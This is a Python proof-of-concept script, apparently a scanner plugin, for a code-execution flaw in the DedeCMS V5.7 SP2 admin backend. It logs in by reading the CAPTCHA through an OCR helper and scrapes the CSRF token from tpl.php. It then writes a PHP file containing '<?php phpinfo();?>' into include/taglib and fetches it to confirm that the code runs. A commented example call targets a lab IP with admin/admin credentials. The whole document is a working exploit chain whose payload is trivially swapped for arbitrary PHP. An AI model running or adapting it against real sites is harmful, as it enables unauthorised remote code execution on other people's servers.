# coding: utf-8
import requests
import re
from lib.Identification_vercode import image_str

def save_img(bytes):
    with open("data/vdimgck.php", "wb") as f:
        f.write(bytes)

def login_check(content):
    # 这里返回的情况是动态写入的,因此不可以用lxml
    pattern = re.compile("document\.write\((.*?)\)")
    result = pattern.findall(content)[2]
    return result


#DedeCMS V5.7 SP2后台存在代码执行漏洞
def poc(url,logindict,user_agent,proxy):

    url = url.strip("/")
    # Authentication:
    session = requests.Session()
    auth_url=url+'/dede/login.php'
    username=logindict.keys()
    password=logindict.values()
    header = {'User-Agent': user_agent}
    vdcode = ""

    for i in range(10):
        #获取验证码
        try:
            while len(vdcode) < 4:
                if proxy:
                    proxies = {
                        "http": "http://%(proxy)s/" % {'proxy': proxy},
                        "https": "http://%(proxy)s/" % {'proxy': proxy}
                    }
                    bytes_img = session.get(url+"/include/vdimgck.php", headers=header, proxies=proxies, timeout=5)
                else:
                    bytes_img = session.get(url+"/include/vdimgck.php", headers=header, timeout=5)
                bytes_img=bytes_img.content
                save_img(bytes_img)
                vdcode=image_str("data/vdimgck.php")
                # print(vdcode)
        except Exception as error:
                pass
        data = {
            "gotopage":url+'/dede/',
            "dopost":"login",
            "adminstyle":"newdedecms",
            "userid": username,
            "pwd": password,
            "validate": vdcode,
            "sm1":''
        }

        if proxy:
            proxies = {
                "http": "http://%(proxy)s/" % {'proxy': proxy},
                "https": "http://%(proxy)s/" % {'proxy': proxy}
            }
            response = session.post(auth_url, headers=header, data=data, proxies=proxies, timeout=5)
        else:
            response = session.post(auth_url, headers=header, data=data, timeout=5)

        loginResult = login_check(response.text)
        # print(loginResult)
        if response.status_code == 200 and "成功登录" in loginResult:
            # 获取tokn
            tokn_url = url + '/dede/tpl.php?action=upload'
            if proxy:
                proxies = {
                    "http": "http://%(proxy)s/" % {'proxy': proxy},
                    "https": "http://%(proxy)s/" % {'proxy': proxy}
                }
                response = session.get(tokn_url, headers=header, proxies=proxies, timeout=5)
            else:
                response = session.get(tokn_url, headers=header, timeout=5)
            check = response.text
            token = check[check.find("<input name='token' type='hidden' value='") + 41:]
            token = token[:token.find("'")]
            # print(token)

            # 漏洞位置
            exploit_url = url + '/dede/tpl.php?filename=phpinfo.lib.php&action=savetagfile&content=<?php phpinfo();?>&token=' + token
            #验证url
            v_url = url + '/include/taglib/phpinfo.lib.php'
            if proxy:
                proxies = {
                    "http": "http://%(proxy)s/" % {'proxy': proxy},
                    "https": "http://%(proxy)s/" % {'proxy': proxy}
                }
                response = session.get(exploit_url, headers=header, proxies=proxies)
                response = session.get(v_url, headers=header, proxies=proxies)
            else:
                response = session.get(exploit_url, headers=header)
                response = session.get(v_url, headers=header)

            break


    # with open('../../data/b.html','wb') as f:
    #     f.write(response.content)
    if response.status_code==200 and 'PHP Version' in response.text:

        return 'DedeCMS V5.7 SP2 - 后台存在代码执行漏洞'


def run(url,logindict,user_agent,proxies):
    if logindict:
        result = poc(url,logindict,user_agent,proxies)
        return result

# run("http://192.168.220.128/DedeCMS/DedeCMS-V5.7-UTF8-SP2/uploads/",{'admin':'admin'},'','')

